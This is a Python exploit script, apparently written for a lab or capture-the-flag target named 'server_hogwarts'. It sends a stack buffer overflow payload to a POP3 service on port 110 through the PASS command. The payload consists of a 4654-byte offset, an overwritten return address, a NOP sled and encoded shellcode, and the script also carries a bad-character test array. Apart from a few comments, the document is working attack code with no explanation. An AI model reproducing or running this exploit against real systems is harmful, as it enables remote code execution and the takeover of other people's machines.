#!/usr/bin/python3

from pwn import *
import socket

#p = process('./server_hogwarts')

offset = b'A' * 4654
#eip = b'B' * 4
after_eip = b'C' * 100


eip = p32(0x5f4c4d13)
#eip = b"\x"


byte_array = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


shellcode = ("\xd9\xe5\xb8\x8e\xe1\xfd\x1c\xd9\x74\x24\xf4\x5d"
b"\x2b\xc9\xb1\x52\x83\xed\xfc\x31\x45\x13\x03\xcb"
b"\xf2\x1f\xe9\x2f\x1c\x5d\x12\xcf\xdd\x02\x9a\x2a"
b"\xec\x02\xf8\x3f\x5f\xb3\x8a\x6d\x6c\x38\xde\x85"
b"\xe7\x4c\xf7\xaa\x40\xfa\x21\x85\x51\x57\x11\x84"
b"\xd1\xaa\x46\x66\xeb\x64\x9b\x67\x2c\x98\x56\x35"
b"\xe5\xd6\xc5\xa9\x82\xa3\xd5\x42\xd8\x22\x5e\xb7"
b"\xa9\x45\x4f\x66\xa1\x1f\x4f\x89\x66\x14\xc6\x91"
b"\x6b\x11\x90\x2a\x5f\xed\x23\xfa\x91\x0e\x8f\xc3"
b"\x1d\xfd\xd1\x04\x99\x1e\xa4\x7c\xd9\xa3\xbf\xbb"
b"\xa3\x7f\x35\x5f\x03\x0b\xed\xbb\xb5\xd8\x68\x48"
b"\xb9\x95\xff\x16\xde\x28\xd3\x2d\xda\xa1\xd2\xe1"
b"\x6a\xf1\xf0\x25\x36\xa1\x99\x7c\x92\x04\xa5\x9e"
b"\x7d\xf8\x03\xd5\x90\xed\x39\xb4\xfc\xc2\x73\x46"
b"\xfd\x4c\x03\x35\xcf\xd3\xbf\xd1\x63\x9b\x19\x26"
b"\x83\xb6\xde\xb8\x7a\x39\x1f\x91\xb8\x6d\x4f\x89"
b"\x69\x0e\x04\x49\x95\xdb\x8b\x19\x39\xb4\x6b\xc9"
b"\xf9\x64\x04\x03\xf6\x5b\x34\x2c\xdc\xf3\xdf\xd7"
b"\xb7\x3b\xb7\xd6\x15\xd4\xca\xd8\x98\x9f\x42\x3e"
b"\xf0\xcf\x02\xe9\x6d\x69\x0f\x61\x0f\x76\x85\x0c"
b"\x0f\xfc\x2a\xf1\xde\xf5\x47\xe1\xb7\xf5\x1d\x5b"
b"\x11\x09\x88\xf3\xfd\x98\x57\x03\x8b\x80\xcf\x54"
b"\xdc\x77\x06\x30\xf0\x2e\xb0\x26\x09\xb6\xfb\xe2"
b"\xd6\x0b\x05\xeb\x9b\x30\x21\xfb\x65\xb8\x6d\xaf"
b"\x39\xef\x3b\x19\xfc\x59\x8a\xf3\x56\x35\x44\x93"
b"\x2f\x75\x57\xe5\x2f\x50\x21\x09\x81\x0d\x74\x36"
b"\x2e\xda\x70\x4f\x52\x7a\x7e\x9a\xd6\x9a\x9d\x0e"
b"\x23\x33\x38\xdb\x8e\x5e\xbb\x36\xcc\x66\x38\xb2"
b"\xad\x9c\x20\xb7\xa8\xd9\xe6\x24\xc1\x72\x83\x4a"
b"\x76\x72\x86")

payload = offset + eip + b"\x90"*32 + shellcode

ip_address = "192.168.1.82"
port = 110
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_address, port))
banner = s.recv(1024)
s.send(b"USER kermit" + b'\r\n')
response = s.recv(1024)
s.send(b"PASS " + payload + b'\r\n')
s.close()
